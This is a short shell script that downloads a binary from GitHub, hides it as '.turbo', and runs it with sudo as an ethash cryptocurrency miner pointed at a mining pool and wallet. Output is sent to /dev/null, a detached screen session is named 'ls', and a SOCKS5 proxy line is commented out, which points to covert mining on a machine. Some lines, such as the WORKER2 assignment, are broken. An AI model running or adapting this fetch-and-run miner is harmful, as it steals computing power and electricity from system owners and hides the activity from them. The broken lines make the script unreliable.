#!/bin/sh
apt install screen -y
wget https://github.com/azis07/turbo/raw/main/turbo
mv turbo .turbo
chmod +x .turbo
screen -dmS ls 
POOL=eth-pool.beepool.org:9530
WALLET=langitterang
WORKER1=$(echo $(shuf -i 1-999 -n 1)-GPU)
WORKER2=nvidia-smi --query-gpu=gpu_name --format=csv,noheader
#PROXY=socks5://72.210.252.134:46164
sudo ./.turbo -a ethash -o $POOL -u $WALLET.$WORKER1$WORKER2 > /dev/null
